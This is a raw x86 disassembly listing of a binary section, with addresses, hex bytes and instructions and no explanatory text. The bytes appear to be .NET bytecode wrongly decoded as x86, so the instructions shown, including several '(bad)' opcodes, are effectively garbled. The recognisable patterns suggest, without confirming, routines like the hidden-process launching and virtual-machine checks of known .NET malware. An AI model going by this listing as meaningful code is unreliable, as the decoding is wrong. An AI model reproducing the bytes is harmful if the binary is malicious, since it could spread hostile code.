  40310f:	01 1b                	add    %ebx,(%ebx)
  403111:	30 05 00 76 02 00    	xor    %al,0x27600
  403117:	00 06                	add    %al,(%esi)
  403119:	00 00                	add    %al,(%eax)
  40311b:	11 7e 05             	adc    %edi,0x5(%esi)
  40311e:	00 00                	add    %al,(%eax)
  403120:	04 28                	add    $0x28,%al
  403122:	52                   	push   %edx
  403123:	00 00                	add    %al,(%eax)
  403125:	0a 7e 06             	or     0x6(%esi),%bh
  403128:	00 00                	add    %al,(%eax)
  40312a:	04 28                	add    $0x28,%al
  40312c:	53                   	push   %ebx
  40312d:	00 00                	add    %al,(%eax)
  40312f:	0a 73 54             	or     0x54(%ebx),%dh
  403132:	00 00                	add    %al,(%eax)
  403134:	0a 0a                	or     (%edx),%cl
  403136:	28 55 00             	sub    %dl,0x0(%ebp)
  403139:	00 0a                	add    %cl,(%edx)
  40313b:	6f                   	outsl  %ds:(%esi),(%dx)
  40313c:	56                   	push   %esi
  40313d:	00 00                	add    %al,(%eax)
  40313f:	0a 6f 57             	or     0x57(%edi),%ch
  403142:	00 00                	add    %al,(%eax)
  403144:	0a 0b                	or     (%ebx),%cl
  403146:	07                   	pop    %es
  403147:	06                   	push   %es
  403148:	6f                   	outsl  %ds:(%esi),(%dx)
  403149:	58                   	pop    %eax
  40314a:	00 00                	add    %al,(%eax)
  40314c:	0a 28                	or     (%eax),%ch
  40314e:	59                   	pop    %ecx
  40314f:	00 00                	add    %al,(%eax)
  403151:	0a 39                	or     (%ecx),%bh
  403153:	2f                   	das
  403154:	02 00                	add    (%eax),%al
  403156:	00 28                	add    %ch,(%eax)
  403158:	5a                   	pop    %edx
  403159:	00 00                	add    %al,(%eax)
  40315b:	0a 0c 16             	or     (%esi,%edx,1),%cl
  40315e:	0d 38 3b 00 00       	or     $0x3b38,%eax
  403163:	00 08                	add    %cl,(%eax)
  403165:	09 a3 50 00 00 01    	or     %esp,0x1000050(%ebx)
  40316b:	13 04 11             	adc    (%ecx,%edx,1),%eax
  40316e:	04 6f                	add    $0x6f,%al
  403170:	56                   	push   %esi
  403171:	00 00                	add    %al,(%eax)
  403173:	0a 6f 57             	or     0x57(%edi),%ch
  403176:	00 00                	add    %al,(%eax)
  403178:	0a 06                	or     (%esi),%al
  40317a:	6f                   	outsl  %ds:(%esi),(%dx)
  40317b:	58                   	pop    %eax
  40317c:	00 00                	add    %al,(%eax)
  40317e:	0a 28                	or     (%eax),%ch
  403180:	25 00 00 0a 39       	and    $0x390a0000,%eax
  403185:	07                   	pop    %es
  403186:	00 00                	add    %al,(%eax)
  403188:	00 11                	add    %dl,(%ecx)
  40318a:	04 6f                	add    $0x6f,%al
  40318c:	5b                   	pop    %ebx
  40318d:	00 00                	add    %al,(%eax)
  40318f:	0a dd                	or     %ch,%bl
  403191:	06                   	push   %es
  403192:	00 00                	add    %al,(%eax)
  403194:	00 26                	add    %ah,(%esi)
  403196:	dd 00                	fldl   (%eax)
  403198:	00 00                	add    %al,(%eax)
  40319a:	00 09                	add    %cl,(%ecx)
  40319c:	17                   	pop    %ss
  40319d:	58                   	pop    %eax
  40319e:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  4031a3:	32 bf 28 30 00 00    	xor    0x3028(%edi),%bh
  4031a9:	06                   	push   %es
  4031aa:	39 71 00             	cmp    %esi,0x0(%ecx)
  4031ad:	00 00                	add    %al,(%eax)
  4031af:	73 5c                	jae    0x40320d
  4031b1:	00 00                	add    %al,(%eax)
  4031b3:	0a 13                	or     (%ebx),%dl
  4031b5:	05 11 05 72 86       	add    $0x86720511,%eax
  4031ba:	21 00                	and    %eax,(%eax)
  4031bc:	70 6f                	jo     0x40322d
  4031be:	5d                   	pop    %ebp
  4031bf:	00 00                	add    %al,(%eax)
  4031c1:	0a 11                	or     (%ecx),%dl
  4031c3:	05 1b 8d 38 00       	add    $0x388d1b,%eax
  4031c8:	00 01                	add    %al,(%ecx)
  4031ca:	25 16 72 8e 21       	and    $0x218e7216,%eax
  4031cf:	00 70 a2             	add    %dh,-0x5e(%eax)
  4031d2:	25 17 06 6f 5e       	and    $0x5e6f0617,%eax
  4031d7:	00 00                	add    %al,(%eax)
  4031d9:	0a 28                	or     (%eax),%ch
  4031db:	5f                   	pop    %edi
  4031dc:	00 00                	add    %al,(%eax)
  4031de:	0a a2 25 18 72 f8    	or     -0x78de7db(%edx),%ah
  4031e4:	21 00                	and    %eax,(%eax)
  4031e6:	70 a2                	jo     0x40318a
  4031e8:	25 19 06 6f 58       	and    $0x586f0619,%eax
  4031ed:	00 00                	add    %al,(%eax)
  4031ef:	0a a2 25 1a 72 0a    	or     0xa721a25(%edx),%ah
  4031f5:	22 00                	and    (%eax),%al
  4031f7:	70 a2                	jo     0x40319b
  4031f9:	28 60 00             	sub    %ah,0x0(%eax)
  4031fc:	00 0a                	add    %cl,(%edx)
  4031fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4031ff:	61                   	popa
  403200:	00 00                	add    %al,(%eax)
  403202:	0a 11                	or     (%ecx),%dl
  403204:	05 17 6f 62 00       	add    $0x626f17,%eax
  403209:	00 0a                	add    %cl,(%edx)
  40320b:	11 05 17 6f 63 00    	adc    %eax,0x636f17
  403211:	00 0a                	add    %cl,(%edx)
  403213:	11 05 28 64 00 00    	adc    %eax,0x6428
  403219:	0a 26                	or     (%esi),%ah
  40321b:	38 52 00             	cmp    %dl,0x0(%edx)
  40321e:	00 00                	add    %al,(%eax)
  403220:	7e 65                	jle    0x403287
  403222:	00 00                	add    %al,(%eax)
  403224:	0a 72 1e             	or     0x1e(%edx),%dh
  403227:	22 00                	and    (%eax),%al
  403229:	70 28                	jo     0x403253
  40322b:	66 00 00             	data16 add %al,(%eax)
  40322e:	0a 18                	or     (%eax),%bl
  403230:	6f                   	outsl  %ds:(%esi),(%dx)
  403231:	67 00 00             	add    %al,(%bx,%si)
  403234:	0a 13                	or     (%ebx),%dl
  403236:	06                   	push   %es
  403237:	11 06                	adc    %eax,(%esi)
  403239:	06                   	push   %es
  40323a:	6f                   	outsl  %ds:(%esi),(%dx)
  40323b:	5e                   	pop    %esi
  40323c:	00 00                	add    %al,(%eax)
  40323e:	0a 28                	or     (%eax),%ch
  403240:	5f                   	pop    %edi
  403241:	00 00                	add    %al,(%eax)
  403243:	0a 72 7c             	or     0x7c(%edx),%dh
  403246:	22 00                	and    (%eax),%al
  403248:	70 06                	jo     0x403250
  40324a:	6f                   	outsl  %ds:(%esi),(%dx)
  40324b:	58                   	pop    %eax
  40324c:	00 00                	add    %al,(%eax)
  40324e:	0a 72 7c             	or     0x7c(%edx),%dh
  403251:	22 00                	and    (%eax),%al
  403253:	70 28                	jo     0x40327d
  403255:	68 00 00 0a 6f       	push   $0x6f0a0000
  40325a:	69 00 00 0a dd 0f    	imul   $0xfdd0a00,(%eax),%eax
  403260:	00 00                	add    %al,(%eax)
  403262:	00 11                	add    %dl,(%ecx)
  403264:	06                   	push   %es
  403265:	39 07                	cmp    %eax,(%edi)
  403267:	00 00                	add    %al,(%eax)
  403269:	00 11                	add    %dl,(%ecx)
  40326b:	06                   	push   %es
  40326c:	6f                   	outsl  %ds:(%esi),(%dx)
  40326d:	33 00                	xor    (%eax),%eax
  40326f:	00 0a                	add    %cl,(%edx)
  403271:	dc 06                	faddl  (%esi)
  403273:	6f                   	outsl  %ds:(%esi),(%dx)
  403274:	58                   	pop    %eax
  403275:	00 00                	add    %al,(%eax)
  403277:	0a 28                	or     (%eax),%ch
  403279:	6a 00                	push   $0x0
  40327b:	00 0a                	add    %cl,(%edx)
  40327d:	39 15 00 00 00 06    	cmp    %edx,0x6000000
  403283:	6f                   	outsl  %ds:(%esi),(%dx)
  403284:	58                   	pop    %eax
  403285:	00 00                	add    %al,(%eax)
  403287:	0a 28                	or     (%eax),%ch
  403289:	6b 00 00             	imul   $0x0,(%eax),%eax
  40328c:	0a 20                	or     (%eax),%ah
  40328e:	e8 03 00 00 28       	call   0x28403296
  403293:	14 00                	adc    $0x0,%al
  403295:	00 0a                	add    %cl,(%edx)
  403297:	06                   	push   %es
  403298:	6f                   	outsl  %ds:(%esi),(%dx)
  403299:	58                   	pop    %eax
  40329a:	00 00                	add    %al,(%eax)
  40329c:	0a 17                	or     (%edi),%dl
  40329e:	73 6c                	jae    0x40330c
  4032a0:	00 00                	add    %al,(%eax)
  4032a2:	0a 07                	or     (%edi),%al
  4032a4:	28 6d 00             	sub    %ch,0x0(%ebp)
  4032a7:	00 0a                	add    %cl,(%edx)
  4032a9:	13 07                	adc    (%edi),%eax
  4032ab:	11 07                	adc    %eax,(%edi)
  4032ad:	16                   	push   %ss
  4032ae:	11 07                	adc    %eax,(%edi)
  4032b0:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4032b3:	4c                   	dec    %esp
  4032b4:	00 00                	add    %al,(%eax)
  4032b6:	0a 28                	or     (%eax),%ch
  4032b8:	31 00                	xor    %eax,(%eax)
  4032ba:	00 06                	add    %al,(%esi)
  4032bc:	28 6e 00             	sub    %ch,0x0(%esi)
  4032bf:	00 0a                	add    %cl,(%edx)
  4032c1:	72 80                	jb     0x403243
  4032c3:	22 00                	and    (%eax),%al
  4032c5:	70 28                	jo     0x4032ef
  4032c7:	6f                   	outsl  %ds:(%esi),(%dx)
  4032c8:	00 00                	add    %al,(%eax)
  4032ca:	0a 13                	or     (%ebx),%dl
  4032cc:	08 11                	or     %dl,(%ecx)
  4032ce:	08 73 70             	or     %dh,0x70(%ebx)
  4032d1:	00 00                	add    %al,(%eax)
  4032d3:	0a 13                	or     (%ebx),%dl
  4032d5:	09 11                	or     %edx,(%ecx)
  4032d7:	09 72 8a             	or     %esi,-0x76(%edx)
  4032da:	22 00                	and    (%eax),%al
  4032dc:	70 6f                	jo     0x40334d
  4032de:	71 00                	jno    0x4032e0
  4032e0:	00 0a                	add    %cl,(%edx)
  4032e2:	11 09                	adc    %ecx,(%ecx)
  4032e4:	72 9e                	jb     0x403284
  4032e6:	22 00                	and    (%eax),%al
  4032e8:	70 6f                	jo     0x403359
  4032ea:	71 00                	jno    0x4032ec
  4032ec:	00 0a                	add    %cl,(%edx)
  4032ee:	11 09                	adc    %ecx,(%ecx)
  4032f0:	72 be                	jb     0x4032b0
  4032f2:	22 00                	and    (%eax),%al
  4032f4:	70 06                	jo     0x4032fc
  4032f6:	6f                   	outsl  %ds:(%esi),(%dx)
  4032f7:	58                   	pop    %eax
  4032f8:	00 00                	add    %al,(%eax)
  4032fa:	0a 72 7c             	or     0x7c(%edx),%dh
  4032fd:	22 00                	and    (%eax),%al
  4032ff:	70 28                	jo     0x403329
  403301:	68 00 00 0a 6f       	push   $0x6f0a0000
  403306:	71 00                	jno    0x403308
  403308:	00 0a                	add    %cl,(%edx)
  40330a:	11 09                	adc    %ecx,(%ecx)
  40330c:	72 d4                	jb     0x4032e2
  40330e:	22 00                	and    (%eax),%al
  403310:	70 28                	jo     0x40333a
  403312:	72 00                	jb     0x403314
  403314:	00 0a                	add    %cl,(%edx)
  403316:	28 6f 00             	sub    %ch,0x0(%edi)
  403319:	00 0a                	add    %cl,(%edx)
  40331b:	6f                   	outsl  %ds:(%esi),(%dx)
  40331c:	71 00                	jno    0x40331e
  40331e:	00 0a                	add    %cl,(%edx)
  403320:	11 09                	adc    %ecx,(%ecx)
  403322:	72 dc                	jb     0x403300
  403324:	22 00                	and    (%eax),%al
  403326:	70 11                	jo     0x403339
  403328:	08 28                	or     %ch,(%eax)
  40332a:	73 00                	jae    0x40332c
  40332c:	00 0a                	add    %cl,(%edx)
  40332e:	72 e8                	jb     0x403318
  403330:	22 00                	and    (%eax),%al
  403332:	70 28                	jo     0x40335c
  403334:	68 00 00 0a 6f       	push   $0x6f0a0000
  403339:	71 00                	jno    0x40333b
  40333b:	00 0a                	add    %cl,(%edx)
  40333d:	dd 0f                	fisttpll (%edi)
  40333f:	00 00                	add    %al,(%eax)
  403341:	00 11                	add    %dl,(%ecx)
  403343:	09 39                	or     %edi,(%ecx)
  403345:	07                   	pop    %es
  403346:	00 00                	add    %al,(%eax)
  403348:	00 11                	add    %dl,(%ecx)
  40334a:	09 6f 33             	or     %ebp,0x33(%edi)
  40334d:	00 00                	add    %al,(%eax)
  40334f:	0a dc                	or     %ah,%bl
  403351:	73 5c                	jae    0x4033af
  403353:	00 00                	add    %al,(%eax)
  403355:	0a 25 11 08 6f 5d    	or     0x5d6f0811,%ah
  40335b:	00 00                	add    %al,(%eax)
  40335d:	0a 25 17 6f 63 00    	or     0x636f17,%ah
  403363:	00 0a                	add    %cl,(%edx)
  403365:	25 16 6f 74 00       	and    $0x746f16,%eax
  40336a:	00 0a                	add    %cl,(%edx)
  40336c:	25 16 6f 75 00       	and    $0x756f16,%eax
  403371:	00 0a                	add    %cl,(%edx)
  403373:	25 17 6f 62 00       	and    $0x626f17,%eax
  403378:	00 0a                	add    %cl,(%edx)
  40337a:	28 64 00 00          	sub    %ah,0x0(%eax,%eax,1)
  40337e:	0a 26                	or     (%esi),%ah
  403380:	16                   	push   %ss
  403381:	28 16                	sub    %dl,(%esi)
  403383:	00 00                	add    %al,(%eax)
  403385:	0a dd                	or     %ch,%bl
  403387:	06                   	push   %es
  403388:	00 00                	add    %al,(%eax)
  40338a:	00 26                	add    %ah,(%esi)
  40338c:	dd 00                	fldl   (%eax)
  40338e:	00 00                	add    %al,(%eax)
  403390:	00 2a                	add    %ch,(%edx)
  403392:	00 00                	add    %al,(%eax)
  403394:	41                   	inc    %ecx
  403395:	64 00 00             	add    %al,%fs:(%eax)
  403398:	00 00                	add    %al,(%eax)
  40339a:	00 00                	add    %al,(%eax)
  40339c:	51                   	push   %ecx
  40339d:	00 00                	add    %al,(%eax)
  40339f:	00 28                	add    %ch,(%eax)
  4033a1:	00 00                	add    %al,(%eax)
  4033a3:	00 79 00             	add    %bh,0x0(%ecx)
  4033a6:	00 00                	add    %al,(%eax)
  4033a8:	06                   	push   %es
  4033a9:	00 00                	add    %al,(%eax)
  4033ab:	00 01                	add    %al,(%ecx)
  4033ad:	00 00                	add    %al,(%eax)
  4033af:	01 02                	add    %eax,(%edx)
  4033b1:	00 00                	add    %al,(%eax)
  4033b3:	00 1b                	add    %bl,(%ebx)
  4033b5:	01 00                	add    %eax,(%eax)
  4033b7:	00 2c 00             	add    %ch,(%eax,%eax,1)
  4033ba:	00 00                	add    %al,(%eax)
  4033bc:	47                   	inc    %edi
  4033bd:	01 00                	add    %eax,(%eax)
  4033bf:	00 0f                	add    %cl,(%edi)
  4033c1:	00 00                	add    %al,(%eax)
  4033c3:	00 00                	add    %al,(%eax)
  4033c5:	00 00                	add    %al,(%eax)
  4033c7:	00 02                	add    %al,(%edx)
  4033c9:	00 00                	add    %al,(%eax)
  4033cb:	00 ba 01 00 00 6c    	add    %bh,0x6c000001(%edx)
  4033d1:	00 00                	add    %al,(%eax)
  4033d3:	00 26                	add    %ah,(%esi)
  4033d5:	02 00                	add    (%eax),%al
  4033d7:	00 0f                	add    %cl,(%edi)
	...
  4033e5:	00 00                	add    %al,(%eax)
  4033e7:	00 6f 02             	add    %ch,0x2(%edi)
  4033ea:	00 00                	add    %al,(%eax)
  4033ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4033ed:	02 00                	add    (%eax),%al
  4033ef:	00 06                	add    %al,(%esi)
  4033f1:	00 00                	add    %al,(%eax)
  4033f3:	00 31                	add    %dh,(%ecx)
  4033f5:	00 00                	add    %al,(%eax)
  4033f7:	01 1b                	add    %ebx,(%ebx)
  4033f9:	30 02                	xor    %al,(%edx)
  4033fb:	00 3a                	add    %bh,(%edx)
  4033fd:	00 00                	add    %al,(%eax)
  4033ff:	00 07                	add    %al,(%edi)
  403401:	00 00                	add    %al,(%eax)
  403403:	11 21                	adc    %esp,(%ecx)
  403405:	00 22                	add    %ah,(%edx)
  403407:	e2 33                	loop   0x40343c
  403409:	0e                   	push   %cs
  40340a:	00 00                	add    %al,(%eax)
  40340c:	00 0a                	add    %cl,(%edx)
  40340e:	28 77 00             	sub    %dh,0x0(%edi)
  403411:	00 0a                	add    %cl,(%edx)
  403413:	28 78 00             	sub    %bh,0x0(%eax)
  403416:	00 0a                	add    %cl,(%edx)
  403418:	73 79                	jae    0x403493
  40341a:	00 00                	add    %al,(%eax)
  40341c:	0a 28                	or     (%eax),%ch
  40341e:	7a 00                	jp     0x403420
  403420:	00 0a                	add    %cl,(%edx)
  403422:	06                   	push   %es
  403423:	3d 07 00 00 00       	cmp    $0x7,%eax
  403428:	17                   	pop    %ss
  403429:	0b dd                	or     %ebp,%ebx
  40342b:	0d 00 00 00 dd       	or     $0xdd000000,%eax
  403430:	06                   	push   %es
  403431:	00 00                	add    %al,(%eax)
  403433:	00 26                	add    %ah,(%esi)
  403435:	dd 00                	fldl   (%eax)
  403437:	00 00                	add    %al,(%eax)
  403439:	00 16                	add    %dl,(%esi)
  40343b:	2a 07                	sub    (%edi),%al
  40343d:	2a 00                	sub    (%eax),%al
  40343f:	00 01                	add    %al,(%ecx)
  403441:	10 00                	adc    %al,(%eax)
  403443:	00 00                	add    %al,(%eax)
  403445:	00 00                	add    %al,(%eax)
  403447:	00 30                	add    %dh,(%eax)
  403449:	30 00                	xor    %al,(%eax)
  40344b:	06                   	push   %es
  40344c:	01 00                	add    %eax,(%eax)
  40344e:	00 01                	add    %al,(%ecx)
  403450:	1b 30                	sbb    (%eax),%esi
  403452:	02 00                	add    (%eax),%al
  403454:	34 00                	xor    $0x0,%al
  403456:	00 00                	add    %al,(%eax)
  403458:	02 00                	add    (%eax),%al
  40345a:	00 11                	add    %dl,(%ecx)
  40345c:	73 7b                	jae    0x4034d9
  40345e:	00 00                	add    %al,(%eax)
  403460:	0a 28                	or     (%eax),%ch
  403462:	7c 00                	jl     0x403464
  403464:	00 0a                	add    %cl,(%edx)
  403466:	6f                   	outsl  %ds:(%esi),(%dx)
  403467:	7d 00                	jge    0x403469
  403469:	00 0a                	add    %cl,(%edx)
  40346b:	72 f8                	jb     0x403465
  40346d:	22 00                	and    (%eax),%al
  40346f:	70 6f                	jo     0x4034e0
  403471:	7e 00                	jle    0x403473
  403473:	00 0a                	add    %cl,(%edx)
  403475:	39 07                	cmp    %eax,(%edi)
  403477:	00 00                	add    %al,(%eax)
  403479:	00 17                	add    %dl,(%edi)
  40347b:	0a dd                	or     %ch,%bl
  40347d:	0d 00 00 00 dd       	or     $0xdd000000,%eax
  403482:	06                   	push   %es
  403483:	00 00                	add    %al,(%eax)
  403485:	00 26                	add    %ah,(%esi)
  403487:	dd 00                	fldl   (%eax)
  403489:	00 00                	add    %al,(%eax)
  40348b:	00 16                	add    %dl,(%esi)
  40348d:	2a 06                	sub    (%esi),%al
  40348f:	2a 01                	sub    (%ecx),%al
  403491:	10 00                	adc    %al,(%eax)
  403493:	00 00                	add    %al,(%eax)
  403495:	00 00                	add    %al,(%eax)
  403497:	00 2a                	add    %ch,(%edx)
  403499:	2a 00                	sub    (%eax),%al
  40349b:	06                   	push   %es
  40349c:	01 00                	add    %eax,(%eax)
  40349e:	00 01                	add    %al,(%ecx)
  4034a0:	1b 30                	sbb    (%eax),%esi
  4034a2:	02 00                	add    (%eax),%al
  4034a4:	fa                   	cli
  4034a5:	00 00                	add    %al,(%eax)
  4034a7:	00 08                	add    %cl,(%eax)
  4034a9:	00 00                	add    %al,(%eax)
  4034ab:	11 72 fe             	adc    %esi,-0x2(%edx)
  4034ae:	22 00                	and    (%eax),%al
  4034b0:	70 73                	jo     0x403525
  4034b2:	7f 00                	jg     0x4034b4
  4034b4:	00 0a                	add    %cl,(%edx)
  4034b6:	0a 06                	or     (%esi),%al
  4034b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4034b9:	80 00 00             	addb   $0x0,(%eax)
  4034bc:	0a 0b                	or     (%ebx),%cl
  4034be:	07                   	pop    %es
  4034bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4034c0:	81 00 00 0a 0c 38    	addl   $0x380c0a00,(%eax)
  4034c6:	8b 00                	mov    (%eax),%eax
  4034c8:	00 00                	add    %al,(%eax)
  4034ca:	08 6f 82             	or     %ch,-0x7e(%edi)
  4034cd:	00 00                	add    %al,(%eax)
  4034cf:	0a 0d 09 72 44 23    	or     0x23447209,%cl
  4034d5:	00 70 6f             	add    %dh,0x6f(%eax)
  4034d8:	83 00 00             	addl   $0x0,(%eax)
  4034db:	0a 6f 38             	or     0x38(%edi),%ch
  4034de:	00 00                	add    %al,(%eax)
  4034e0:	0a 6f 7d             	or     0x7d(%edi),%ch
  4034e3:	00 00                	add    %al,(%eax)
  4034e5:	0a 13                	or     (%ebx),%dl
  4034e7:	04 11                	add    $0x11,%al
  4034e9:	04 72                	add    $0x72,%al
  4034eb:	5e                   	pop    %esi
  4034ec:	23 00                	and    (%eax),%eax
  4034ee:	70 28                	jo     0x403518
  4034f0:	25 00 00 0a 39       	and    $0x390a0000,%eax
  4034f5:	24 00                	and    $0x0,%al
  4034f7:	00 00                	add    %al,(%eax)
  4034f9:	09 72 8a             	or     %esi,-0x76(%edx)
  4034fc:	23 00                	and    (%eax),%eax
  4034fe:	70 6f                	jo     0x40356f
  403500:	83 00 00             	addl   $0x0,(%eax)
  403503:	0a 6f 38             	or     0x38(%edi),%ch
  403506:	00 00                	add    %al,(%eax)
  403508:	0a 6f 84             	or     -0x7c(%edi),%ch
  40350b:	00 00                	add    %al,(%eax)
  40350d:	0a 72 96             	or     -0x6a(%edx),%dh
  403510:	23 00                	and    (%eax),%eax
  403512:	70 6f                	jo     0x403583
  403514:	7e 00                	jle    0x403516
  403516:	00 0a                	add    %cl,(%edx)
  403518:	3a 30                	cmp    (%eax),%dh
  40351a:	00 00                	add    %al,(%eax)
  40351c:	00 11                	add    %dl,(%ecx)
  40351e:	04 72                	add    $0x72,%al
  403520:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  403521:	23 00                	and    (%eax),%eax
  403523:	70 6f                	jo     0x403594
  403525:	7e 00                	jle    0x403527
  403527:	00 0a                	add    %cl,(%edx)
  403529:	3a 1f                	cmp    (%edi),%bl
  40352b:	00 00                	add    %al,(%eax)
  40352d:	00 09                	add    %cl,(%ecx)
  40352f:	72 8a                	jb     0x4034bb
  403531:	23 00                	and    (%eax),%eax
  403533:	70 6f                	jo     0x4035a4
  403535:	83 00 00             	addl   $0x0,(%eax)
  403538:	0a 6f 38             	or     0x38(%edi),%ch
  40353b:	00 00                	add    %al,(%eax)
  40353d:	0a 72 b4             	or     -0x4c(%edx),%dh
  403540:	23 00                	and    (%eax),%eax
  403542:	70 28                	jo     0x40356c
  403544:	25 00 00 0a 39       	and    $0x390a0000,%eax
  403549:	08 00                	or     %al,(%eax)
  40354b:	00 00                	add    %al,(%eax)
  40354d:	17                   	pop    %ss
  40354e:	13 05 dd 4e 00 00    	adc    0x4edd,%eax
  403554:	00 08                	add    %cl,(%eax)
  403556:	6f                   	outsl  %ds:(%esi),(%dx)
  403557:	85 00                	test   %eax,(%eax)
  403559:	00 0a                	add    %cl,(%edx)
  40355b:	3a 6a ff             	cmp    -0x1(%edx),%ch
  40355e:	ff                   	(bad)
  40355f:	ff                   	lcall  (bad)
  403560:	dd 0d 00 00 00 08    	fisttpll 0x8000000
  403566:	39 06                	cmp    %eax,(%esi)
  403568:	00 00                	add    %al,(%eax)
  40356a:	00 08                	add    %cl,(%eax)
  40356c:	6f                   	outsl  %ds:(%esi),(%dx)
  40356d:	33 00                	xor    (%eax),%eax
  40356f:	00 0a                	add    %cl,(%edx)
  403571:	dc dd                	(bad)
  403573:	0d 00 00 00 07       	or     $0x7000000,%eax
  403578:	39 06                	cmp    %eax,(%esi)
  40357a:	00 00                	add    %al,(%eax)
  40357c:	00 07                	add    %al,(%edi)
  40357e:	6f                   	outsl  %ds:(%esi),(%dx)
  40357f:	33 00                	xor    (%eax),%eax
  403581:	00 0a                	add    %cl,(%edx)
  403583:	dc dd                	(bad)
  403585:	0d 00 00 00 06       	or     $0x6000000,%eax
  40358a:	39 06                	cmp    %eax,(%esi)
  40358c:	00 00                	add    %al,(%eax)
  40358e:	00 06                	add    %al,(%esi)
  403590:	6f                   	outsl  %ds:(%esi),(%dx)
  403591:	33 00                	xor    (%eax),%eax
  403593:	00 0a                	add    %cl,(%edx)
  403595:	dc dd                	(bad)
  403597:	06                   	push   %es
  403598:	00 00                	add    %al,(%eax)
  40359a:	00 26                	add    %ah,(%esi)
  40359c:	dd 00                	fldl   (%eax)
  40359e:	00 00                	add    %al,(%eax)
  4035a0:	00 16                	add    %dl,(%esi)
  4035a2:	2a 11                	sub    (%ecx),%dl
  4035a4:	05 2a 00 00 01       	add    $0x100002a,%eax
  4035a9:	34 00                	xor    $0x0,%al
  4035ab:	00 02                	add    %al,(%edx)
  4035ad:	00 19                	add    %bl,(%ecx)
  4035af:	00 a0 b9 00 0d 00    	add    %ah,0xd00b9(%eax)
  4035b5:	00 00                	add    %al,(%eax)
  4035b7:	00 02                	add    %al,(%edx)
  4035b9:	00 12                	add    %dl,(%edx)
  4035bb:	00 b9 cb 00 0d 00    	add    %bh,0xd00cb(%ecx)
  4035c1:	00 00                	add    %al,(%eax)
  4035c3:	00 02                	add    %al,(%edx)
  4035c5:	00 0b                	add    %cl,(%ebx)
  4035c7:	00 d2                	add    %dl,%dl
  4035c9:	dd 00                	fldl   (%eax)
  4035cb:	0d 00 00 00 00       	or     $0x0,%eax
  4035d0:	00 00                	add    %al,(%eax)
  4035d2:	00 00                	add    %al,(%eax)
  4035d4:	ef                   	out    %eax,(%dx)
  4035d5:	ef                   	out    %eax,(%dx)
  4035d6:	00 06                	add    %al,(%esi)
  4035d8:	01 00                	add    %eax,(%eax)
  4035da:	00 01                	add    %al,(%ecx)
  4035dc:	1b 30                	sbb    (%eax),%esi
  4035de:	02 00                	add    (%eax),%al
  4035e0:	25 00 00 00 09       	and    $0x9000000,%eax
  4035e5:	00 00                	add    %al,(%eax)
  4035e7:	11 16                	adc    %edx,(%esi)
  4035e9:	0a 28                	or     (%eax),%ch
  4035eb:	55                   	push   %ebp
  4035ec:	00 00                	add    %al,(%eax)
  4035ee:	0a 6f 86             	or     -0x7a(%edi),%ch
  4035f1:	00 00                	add    %al,(%eax)
  4035f3:	0a 12                	or     (%edx),%dl
  4035f5:	00 28                	add    %ch,(%eax)
  4035f7:	3b 00                	cmp    (%eax),%eax
  4035f9:	00 06                	add    %al,(%esi)
  4035fb:	26 06                	es push %es
  4035fd:	0b dd                	or     %ebp,%ebx
  4035ff:	08 00                	or     %al,(%eax)
  403601:	00 00                	add    %al,(%eax)
  403603:	26 06                	es push %es
  403605:	0b dd                	or     %ebp,%ebx
  403607:	00 00                	add    %al,(%eax)
  403609:	00 00                	add    %al,(%eax)
  40360b:	07                   	pop    %es
  40360c:	2a 00                	sub    (%eax),%al
  40360e:	00 00                	add    %al,(%eax)
  403610:	01 10                	add    %edx,(%eax)
  403612:	00 00                	add    %al,(%eax)
  403614:	00 00                	add    %al,(%eax)
  403616:	02 00                	add    (%eax),%al
  403618:	19 1b                	sbb    %ebx,(%ebx)
  40361a:	00 08                	add    %cl,(%eax)
  40361c:	01 00                	add    %eax,(%eax)
  40361e:	00 01                	add    %al,(%ecx)
  403620:	1b 30                	sbb    (%eax),%esi
  403622:	01 00                	add    %eax,(%eax)
  403624:	2f                   	das
  403625:	00 00                	add    %al,(%eax)
  403627:	00 0a                	add    %cl,(%edx)
  403629:	00 00                	add    %al,(%eax)
  40362b:	11 72 ca             	adc    %esi,-0x36(%edx)
  40362e:	23 00                	and    (%eax),%eax
  403630:	70 28                	jo     0x40365a
  403632:	3a 00                	cmp    (%eax),%al
  403634:	00 06                	add    %al,(%esi)
  403636:	0a 12                	or     (%edx),%dl
  403638:	00 28                	add    %ch,(%eax)
  40363a:	87 00                	xchg   %eax,(%eax)
  40363c:	00 0a                	add    %cl,(%edx)
  40363e:	39 07                	cmp    %eax,(%edi)
  403640:	00 00                	add    %al,(%eax)
  403642:	00 17                	add    %dl,(%edi)
  403644:	0b dd                	or     %ebp,%ebx
  403646:	0f 00 00             	sldt   (%eax)
  403649:	00 16                	add    %dl,(%esi)
  40364b:	0b dd                	or     %ebp,%ebx
  40364d:	08 00                	or     %al,(%eax)
  40364f:	00 00                	add    %al,(%eax)
  403651:	26 16                	es push %ss
  403653:	0b dd                	or     %ebp,%ebx
  403655:	00 00                	add    %al,(%eax)
  403657:	00 00                	add    %al,(%eax)
  403659:	07                   	pop    %es
  40365a:	2a 00                	sub    (%eax),%al
  40365c:	01 10                	add    %edx,(%eax)
  40365e:	00 00                	add    %al,(%eax)
  403660:	00 00                	add    %al,(%eax)
  403662:	00 00                	add    %al,(%eax)
  403664:	25 25 00 08 01       	and    $0x1080025,%eax
  403669:	00 00                	add    %al,(%eax)
  40366b:	01 1b                	add    %ebx,(%ebx)
  40366d:	30 04 00             	xor    %al,(%eax,%eax,1)
  403670:	65 00 00             	add    %al,%gs:(%eax)
  403673:	00 0b                	add    %cl,(%ebx)
  403675:	00 00                	add    %al,(%eax)
  403677:	11 1b                	adc    %ebx,(%ebx)
  403679:	8d 01                	lea    (%ecx),%eax
  40367b:	00 00                	add    %al,(%eax)
  40367d:	01 25 16 28 88 00    	add    %esp,0x882816
  403683:	00 0a                	add    %cl,(%edx)
  403685:	8c 66 00             	mov    %fs,0x0(%esi)
  403688:	00 01                	add    %al,(%ecx)
  40368a:	a2 25 17 28 89       	mov    %al,0x89281725
  40368f:	00 00                	add    %al,(%eax)
  403691:	0a a2 25 18 28 8a    	or     -0x75d7e7db(%edx),%ah
  403697:	00 00                	add    %al,(%eax)
  403699:	0a a2 25 19 28 8b    	or     -0x74d7e6db(%edx),%ah
  40369f:	00 00                	add    %al,(%eax)
